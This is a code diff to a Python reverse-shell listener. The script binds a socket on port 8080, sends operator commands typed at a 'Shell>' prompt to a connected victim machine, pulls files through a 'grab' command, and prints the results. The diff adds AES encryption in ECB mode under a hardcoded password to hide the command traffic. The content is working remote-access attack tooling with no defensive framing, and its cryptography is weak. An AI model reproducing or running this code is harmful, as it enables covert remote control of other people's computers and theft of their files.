@@ -6,16 +6,22 @@ import sys
 import binascii
 import Padding
 
+password='hello'
+ival=10
+
+key = hashlib.sha256(password.encode()).digest()
+
+
 #  Test if its running netstat -antp | grep 8080
 #  on windows netstat -ano
 #  The tcp client should be run on linux only
 
-def encrypt(plaintext,key, mode,iv):
-    encobj = AES.new(key,mode,iv)
+def encrypt(plaintext,key, mode):
+    encobj = AES.new(key,mode)
     return(encobj.encrypt(plaintext))
 
-def decrypt(ciphertext,key, mode,iv):
-    encobj = AES.new(key,mode,iv)
+def decrypt(ciphertext,key, mode):
+    encobj = AES.new(key,mode)
     return(encobj.decrypt(ciphertext))
 
 def transfer(conn, command):
@@ -47,7 +53,7 @@ def transfer(conn, command):
 def connect():
     print("[+] - Attempting to connect to server connection...")
     s = socket.socket()
-    s.bind(("192.168.1.183", 8080))
+    s.bind(("10.174.15.6", 8080))
     s.listen(1)
     conn, addr = s.accept()
 
@@ -56,6 +62,7 @@ def connect():
 
     while True:
         command = input("Shell>")
+        
         if "terminate" in command:
             conn.send("terminate".encode())
             conn.close()
@@ -65,9 +72,20 @@ def connect():
         elif 'grab' in command:
             transfer(conn, command)
         else:
-            conn.send(command.encode())
+            plaintext=command
+            
+            plaintext = Padding.appendPadding(plaintext,blocksize=Padding.AES_blocksize,mode=0)
+            #print ("Input data (CMS): "+binascii.hexlify(plaintext.encode()).decode())
+
+            ciphertext = encrypt(plaintext.encode(),key,AES.MODE_ECB)
+            #ciphertext = binascii.hexlify(bytearray(ciphertext)).decode()
+            #print("Cipher TExt",ciphertext)
+            #conn.send(command.encode())
+        
+            conn.send(ciphertext)
             print (conn.recv(1024).decode())
 def main():
+      
     connect()
 
 main()
